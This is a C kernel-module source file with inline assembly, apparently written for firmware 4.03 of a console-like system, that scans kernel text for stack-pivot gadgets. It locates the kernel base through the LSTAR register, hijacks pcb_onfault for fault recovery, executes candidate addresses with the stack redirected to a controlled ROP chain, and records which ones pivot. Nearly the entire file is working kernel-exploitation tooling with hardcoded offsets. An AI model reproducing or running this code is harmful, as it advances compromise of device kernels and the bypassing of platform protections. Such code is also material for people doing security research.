#include <stdint.h>

/*
 * pivot_scan_safe v2 — ktext pivot gadget scanner with pcb_onfault recovery
 *
 * Scans ktext FUNCTION EPILOGUES for stack pivot gadgets by probing at
 * known_entry - 1, -2, -3 for each known ktext function pointer.
 *
 * v1 scanned arbitrary consecutive bytes → hit mid-instruction #UD/#GP
 * (not caught by pcb_onfault) → thread died after 10 probes.
 *
 * v2 approach: only probe at function boundaries where bytes are likely
 * valid instruction starts. Uses pcb_onfault (PCB+0x108) for #PF recovery.
 * Accepts that #UD/#GP will kill the thread — progress is tracked live
 * so we know exactly which candidate killed it and can resume.
 *
 * Candidate generation:
 *   Reads all 28 apic_ops function pointers from ktext.
 *   For each entry F, probes at F-1, F-2, F-3 (84 total candidates).
 *   F-1 is almost always `ret` (C3) → safe, confirms infrastructure.
 *   F-3 is where `xchg rsp, rax; ret` (48 94 C3) would live.
 *
 * fw_ver selects the starting candidate index (0-based):
 *   0 = start from first candidate
 *   N = skip first N candidates (for resuming after thread death)
 *
 * Output layout (uint64_t indices):
 *   [0]   magic "PVS2" (0x50565332) | status(32)
 *   [1]   kdata_base
 *   [2]   ktext_base
 *   [3]   td_pcb
 *   [4]   total_candidates generated
 *   [5]   start_index (from fw_ver, for resume)
 *   [6]   num_tested (updated live before each probe)
 *   [7]   num_survived
 *   [8]   num_faulted (pcb_onfault recovered)
 *   [9]   num_pivots
 *   [10]  first pivot ktext offset (0 if none)
 *   [11]  first pivot absolute address
 *   [12]  current_candidate_addr (updated live — if thread dies, this is the killer)
 *   [13]  current_candidate_ktext_off
 *   [14]  current_func_entry (which apic_ops entry we're probing near)
 *   [15]  current_probe_delta (-1, -2, or -3)
 *   [16..47] pivot details: up to 8 pivots × 4 qwords
 *            [16+i*4+0] ktext offset
 *            [16+i*4+1] absolute address
 *            [16+i*4+2] apic_ops index of nearby function
 *            [16+i*4+3] delta from function entry
 *   [63]  sentinel 0xdeadbeefcafe0022
 */

#define MAGIC_PVS2    0x50565332  /* "PVS2" */
#define TD_PCB        0x3f8
#define PCB_ONFAULT   0x108

/* FW 4.03 offsets */
#define OFF_NOP_RET        (-0x9d20ca)
#define APIC_OPS_OFF_KTEXT  0x1934AC8
#define NUM_APIC_OPS        28
#define PROBES_PER_FUNC     3     /* -1, -2, -3 from each entry */

#define ENTRY_STK_SIZE    32
#define MAX_PIVOTS        8
#define MAX_CANDIDATES    (NUM_APIC_OPS * PROBES_PER_FUNC)  /* 84 */

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t*)addr;
}

/* Shared state between C and asm */
static volatile uint64_t saved_rsp;
static volatile uint64_t onfault_ptr;     /* &pcb[0x108] */
static volatile int probe_result;         /* 0=normal, 1=pivot, 2=fault */

/* Pivot chain: where RSP goes if candidate pivots */
static volatile uint64_t pivot_chain[8];

/* Entry stack: [candidate, resume, resume, ...] */
static volatile uint64_t entry_stk[ENTRY_STK_SIZE];

/* Candidate list: generated from apic_ops entries */
static uint64_t candidates[MAX_CANDIDATES];
static uint32_t cand_apic_idx[MAX_CANDIDATES];   /* which apic_ops entry */
static int32_t  cand_delta[MAX_CANDIDATES];       /* -1, -2, or -3 */

/* Naked pivot landing */
__attribute__((naked, used))
static void pivot_landing(void)
{
    __asm__ volatile(
        "movq $1, probe_result(%%rip)\n\t"
        "movq saved_rsp(%%rip), %%rsp\n\t"
        "movq onfault_ptr(%%rip), %%r14\n\t"
        "movq $0, (%%r14)\n\t"
        "jmp .Lprobe_done\n\t"
        ::: "memory"
    );
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t start_index = args->fw_ver;
    volatile uint64_t* out = (volatile uint64_t*)args;
    volatile uint32_t* out32 = (volatile uint32_t*)args;

    /* Zero output */
    for (int i = 0; i < 64; i++)
        out[i] = 0;

    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t nop_ret = kdata_base + OFF_NOP_RET;

    /* Get curthread → td_pcb */
    uint64_t curthread;
    __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
    uint64_t td_pcb = read8(curthread + TD_PCB);

    if (!td_pcb) {
        out32[0] = MAGIC_PVS2;
        out32[1] = 0xFF;
        out[63] = 0xdeadbeefcafe0022ULL;
        return 0;
    }

    onfault_ptr = td_pcb + PCB_ONFAULT;

    /* Read apic_ops table and generate candidate list */
    uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_KTEXT;
    uint32_t num_candidates = 0;

    for (uint32_t i = 0; i < NUM_APIC_OPS; i++) {
        uint64_t func_addr = read8(apic_ops_addr + i * 8);
        if (func_addr < ktext_base || func_addr > ktext_base + 0x2000000)
            continue;  /* skip invalid entries */

        /* Probe at entry-1, entry-2, entry-3 */
        for (int delta = -1; delta >= -PROBES_PER_FUNC; delta--) {
            if (num_candidates >= MAX_CANDIDATES)
                break;
            candidates[num_candidates] = func_addr + delta;
            cand_apic_idx[num_candidates] = i;
            cand_delta[num_candidates] = delta;
            num_candidates++;
        }
    }

    /* Header */
    out32[0] = MAGIC_PVS2;
    out32[1] = 0xAAAA;  /* in-progress */
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = td_pcb;
    out[4] = num_candidates;
    out[5] = start_index;

    /* Set up pivot chain */
    pivot_chain[0] = nop_ret;
    pivot_chain[1] = nop_ret;
    pivot_chain[2] = (uint64_t)pivot_landing;
    pivot_chain[3] = nop_ret;
    pivot_chain[4] = nop_ret;
    pivot_chain[5] = nop_ret;
    pivot_chain[6] = nop_ret;
    pivot_chain[7] = nop_ret;

    uint32_t num_tested = 0;
    uint32_t num_survived = 0;
    uint32_t num_faulted = 0;
    uint32_t num_pivots = 0;

    for (uint32_t idx = start_index; idx < num_candidates; idx++) {
        uint64_t candidate = candidates[idx];

        /* Update progress LIVE (survives thread death) */
        out[6] = num_tested + 1;
        out[12] = candidate;
        out[13] = candidate - ktext_base;
        out[14] = read8(apic_ops_addr + cand_apic_idx[idx] * 8);
        out[15] = (uint64_t)(int64_t)cand_delta[idx];

        /* Also update counters live */
        out[7] = num_survived;
        out[8] = num_faulted;
        out[9] = num_pivots;

        entry_stk[0] = candidate;
        probe_result = 0;

        __asm__ volatile(
            /* Fill entry_stk[1..31] with normal resume address */
            "leaq entry_stk(%%rip), %%rdx\n\t"
            "leaq 1f(%%rip), %%rcx\n\t"
            ".set j, 1\n\t"
            ".rept 31\n\t"
            "movq %%rcx, (j*8)(%%rdx)\n\t"
            ".set j, j+1\n\t"
            ".endr\n\t"

            /* Arm pcb_onfault */
            "movq onfault_ptr(%%rip), %%r14\n\t"
            "leaq 2f(%%rip), %%rcx\n\t"
            "movq %%rcx, (%%r14)\n\t"

            /* Save RSP */
            "movq %%rsp, saved_rsp(%%rip)\n\t"

            /* RAX = pivot_chain */
            "leaq pivot_chain(%%rip), %%rax\n\t"

            /* Switch RSP to entry stack and go */
            "leaq entry_stk(%%rip), %%rsp\n\t"
            "retq\n\t"

            /* Normal return */
            "1:\n\t"
            "movq saved_rsp(%%rip), %%rsp\n\t"
            "movq onfault_ptr(%%rip), %%r14\n\t"
            "movq $0, (%%r14)\n\t"
            "jmp .Lprobe_done\n\t"

            /* Fault recovery (pcb_onfault) */
            "2:\n\t"
            "movq saved_rsp(%%rip), %%rsp\n\t"
            "movq onfault_ptr(%%rip), %%r14\n\t"
            "movq $0, (%%r14)\n\t"
            "movl $2, probe_result(%%rip)\n\t"

            ".globl .Lprobe_done\n\t"
            ".Lprobe_done:\n\t"
            :
            :
            : "rax", "rbx", "rcx", "rdx", "rsi", "rdi",
              "r8", "r9", "r10", "r11", "r14", "r15",
              "memory", "cc"
        );

        num_tested++;

        if (probe_result == 1) {
            /* PIVOT FOUND */
            if (num_pivots < MAX_PIVOTS) {
                out[16 + num_pivots * 4 + 0] = candidate - ktext_base;
                out[16 + num_pivots * 4 + 1] = candidate;
                out[16 + num_pivots * 4 + 2] = cand_apic_idx[idx];
                out[16 + num_pivots * 4 + 3] = (uint64_t)(int64_t)cand_delta[idx];
            }
            if (num_pivots == 0) {
                out[10] = candidate - ktext_base;
                out[11] = candidate;
            }
            num_pivots++;
        } else if (probe_result == 2) {
            num_faulted++;
        } else {
            num_survived++;
        }
    }

    /* Final stats */
    out[6] = num_tested;
    out[7] = num_survived;
    out[8] = num_faulted;
    out[9] = num_pivots;

    out32[1] = (num_pivots > 0) ? 0x0002 : 0x0001;

    out[63] = 0xdeadbeefcafe0022ULL;
    return 0;
}
